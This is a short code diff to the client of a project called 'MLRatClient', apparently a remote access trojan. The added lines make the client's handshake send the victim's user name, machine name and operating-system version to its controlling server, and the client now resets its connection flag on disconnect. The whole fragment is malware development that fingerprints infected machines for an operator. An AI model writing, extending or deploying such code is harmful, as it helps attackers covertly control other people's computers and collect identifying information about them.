@@ -59,7 +59,7 @@ namespace MLRatClient
                     MLClientPlugin _plugin = plugin.Value;
                     _plugin.ClientPlugin.OnConnect(new MLConnection(_plugin.ClientPluginID, OnSend));
                 }
-                networkClient.Send(Guid.Empty, "handshake", Environment.UserName);
+                networkClient.Send(Guid.Empty, "handshake", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName), Environment.OSVersion.ToString());
                 Console.WriteLine("handshake sent");
             }
             else
@@ -127,6 +127,7 @@ namespace MLRatClient
                 MLClientPlugin _plugin = plugin.Value;
                 _plugin.ClientPlugin.OnDisconnect();
             }
+            Connected = false;
         }
 
         static void networkClient_OnDataRetrieved(eSock.Client sender, object[] data)
